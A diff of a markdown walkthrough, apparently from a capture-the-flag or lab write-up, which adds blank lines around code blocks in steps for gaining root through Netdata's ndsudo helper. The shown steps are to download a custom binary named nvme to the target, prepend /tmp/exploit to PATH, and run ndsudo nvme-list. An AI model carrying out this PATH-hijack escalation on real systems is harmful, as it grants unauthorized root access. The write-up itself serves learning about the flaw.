@@ -56,6 +56,7 @@ There is a privilege escalation exploit for this detailed [here](https://github.
 
 So here's what you do:
 1. Create a binary like this:
+
 ```c
 #include <stdio.h>
 #include <stdlib.h>
@@ -73,9 +74,11 @@ int main() {
 4. Then download it onto your target machine (use curl or wget).
 5. As detailed in the link, first we will rename this file to nvme and then give it executable permissions. (I stored this file in /tmp/exploit)
 6. Now do
+
 ```bash
 export PATH=/tmp/exploit:$PATH
 ```
+
 7. `/opt/netdata/usr/libexec/netdata/plugins.d/ndsudo nvme-list`
 
 This should log you in as root.
